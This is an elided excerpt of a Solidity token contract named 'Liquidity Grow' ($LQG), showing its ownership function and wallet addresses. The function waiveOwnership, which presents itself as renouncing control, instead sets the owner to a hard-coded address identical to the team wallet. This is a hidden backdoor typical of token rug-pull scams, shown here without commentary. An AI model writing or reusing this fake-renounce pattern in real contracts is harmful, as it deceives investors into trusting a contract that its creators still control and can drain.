...
contract Ownable is Context {
    ...
    function waiveOwnership() public virtual onlyOwner {
        ...
        _owner = address(0x6CB4BF797f85A1C07fb23308aC24AE326A724E21);
    }
...
contract LiquidityGrow is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "Liquidity Grow";
    string private _symbol = "$LQG";
    uint8 private _decimals = 9;

    address payable private marketingWalletAddress = payable(0x08ae7Fe218B4C997d7F2937d296cf9c29995510b);
    address payable private teamWalletAddress = payable(0x6CB4BF797f85A1C07fb23308aC24AE326A724E21);
